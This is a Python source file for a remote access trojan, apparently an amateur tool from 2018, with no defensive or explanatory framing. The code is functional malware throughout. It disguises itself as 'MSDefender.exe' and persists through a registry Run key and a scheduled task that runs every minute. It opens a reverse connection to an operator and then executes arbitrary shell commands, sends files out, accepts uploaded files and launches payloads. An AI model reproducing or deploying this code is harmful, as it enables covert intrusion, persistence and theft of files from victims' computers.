#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Evil:
    def __init__(self,ip,port):
        self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("\n[+] connection established.\n")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def persist(self):
        hidden_path = os.environ["appdata"] + "\\MSDefender.exe"
        if not os.path.exists(hidden_path):
            shutil.copyfile(sys.executable, hidden_path)
            subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update_defender /t REG_SZ /d "'+hidden_path+'"',shell=True)
            subprocess.call('schtasks /create /tn "updatesec" /sc minute /mo 1 /tr "'+hidden_path+'"',shell=True)
    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(4098)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_sys_cmd(self,cmd):
        DEVNULL = open(os.devnull,'wb')
        return subprocess.check_output(cmd,shell=True,stderr=DEVNULL,stdin=DEVNULL)

    def exec_payload(self, payload):
        # DEVNULL = open(os.devnull, 'wb')
        try:
            if os.path.exists('./'+payload):
                subprocess.Popen(payload, shell=True)
                return "[+] Payload exec."
            else:
                return "[-] Payload not found."
        except Exception:
            return "[-] Failed exec."

    def change_working_dir(self,path):
        os.chdir(path)
        return "Changing dir to " + path

    def read_file(self,path):
        with open(path,"rb") as target_file:
            return base64.b64encode(target_file.read())

    def write_file(self,path,content):
        with open(path,"wb") as target_file:
            target_file.write(base64.b64decode(content))
            return "[+] Upload Successful."

    def run(self):
        while True:
            try:
                # cmd_result = ""
                cmd = self.reliable_recv()
                if cmd[0] == "exit":
                    self.reliable_send("Bye!")
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.change_working_dir(cmd[1])
                elif cmd[0] == "download" and len(cmd) > 1:
                    cmd_result = self.read_file(cmd[1])
                elif cmd[0] == "upload" and len(cmd) > 1:
                    cmd_result = self.write_file(cmd[1],cmd[2])
                elif cmd[0] == "payload" and len(cmd) > 1:
                    cmd_result = self.exec_payload(cmd[1])
                elif cmd[0] == "hand_shake":
                    self.reliable_send("hand_shake_too")
                    continue
                else:
                    cmd_result = self.exec_sys_cmd(cmd)
                if not cmd_result:
                    self.reliable_send("[-] Command exception.")
                    continue
                self.reliable_send(cmd_result)
            except Exception:
                self.reliable_send("[-] Something wrong.")
                continue

        self.connection.close()

try:
    evil = Evil("",2508)
    evil.run()
except Exception:
    sys.exit()
